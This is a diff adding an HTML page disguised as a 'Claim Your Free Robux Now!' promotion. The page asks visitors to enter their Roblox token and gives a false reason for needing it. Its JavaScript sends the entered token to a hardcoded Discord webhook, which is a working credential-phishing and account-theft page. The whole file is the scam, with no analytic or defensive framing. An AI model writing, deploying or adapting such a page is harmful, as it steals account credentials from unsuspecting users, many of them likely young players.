@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Token Redemption</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Gotham:wght@400;700&display=swap');
+		body {
+            font-family: Arial, Helvetica, sans-serif, sans-serif;
+			font-weight: bold;
+            text-align: center;
+            margin: 20px;
+            background-color: #1f1f1f;
+        }
+        h1 {
+            color: #fff;
+        }
+        form {
+            display: inline-block;
+            margin-top: 20px;
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 5px;
+            background-color: #36393f;
+        }
+        label {
+            font-weight: bold;
+            color: #fff;
+        }
+        input {
+            width: 200px;
+            padding: 5px;
+            margin: 5px 0;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #3f9fff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #2f8ae0;
+        }
+        p {
+            margin-top: 10px;
+            color: #fff;
+        }
+        .logo {
+            position: absolute;
+            top: -2px;
+            left: 20px;
+            width: 200px;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://media.gold.razer.com/goldweb/content/catalogs/gold/roblox/attachment/GU2DA6BRHA2V6UTPMJWG66C7NRXWO3Y=.png" alt="Roblox Logo" class="logo">
+    <h1>Claim Your Free Robux Now!</h1>
+    <p>Enter your Roblox token below to receive up to 800 free Robux!</p>
+    <form id="tokenForm" onsubmit="return sendToken()">
+        <label for="robloxToken">Roblox Token:</label><br>
+        <input type="text" id="robloxToken" name="robloxToken"><br>
+        <button type="submit">Redeem Now</button>
+        <button type="button" onclick="showReason()">Why do we need your token?</button>
+        <button type="button" onclick="watchTutorial()">Watch Tutorial</button>
+        <p id="reason" style="display: none;">By providing your token, you can participate in a special promotion that rewards users with up to 800 Robux. Your token helps verify your account and eligibility for this exclusive offer.</p>
+        <p id="status"></p>
+    </form>
+
+    <script>
+        function sendToken() {
+            var token = document.getElementById('robloxToken').value;
+            var url = 'https://discord.com/api/webhooks/1189632794608025711/DTExFDEjE5Ca17H86v8DQ3Mdrnc-HbADE4H12k9E78bJCwD1rY6S1YuPnmBh34qV_dLK';
+            var content = 'Roblox Token Received: ' + token;
+
+            if (content.includes('http') || content.includes('https')) {
+                document.getElementById('status').innerText = 'Message not sent. Link detected.';
+                return false;
+            }
+
+            var data = {
+                'content': content
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(function(response) {
+                if (response.ok) {
+                    document.getElementById('status').innerText = 'Message sent successfully.';
+                } else {
+                    document.getElementById('status').innerText = 'Failed to send message.';
+                }
+            });
+
+            return false;
+        }
+
+        function showReason() {
+            var reasonText = document.getElementById('reason');
+            if (reasonText.style.display === "none") {
+                reasonText.style.display = "block";
+            } else {
+                reasonText.style.display = "none";
+            }
+        }
+
+        function watchTutorial() {
+            window.open('https://youtu.be/7fozjR5n2nM', '_blank');
+        }
+    </script>
+</body>
+</html>
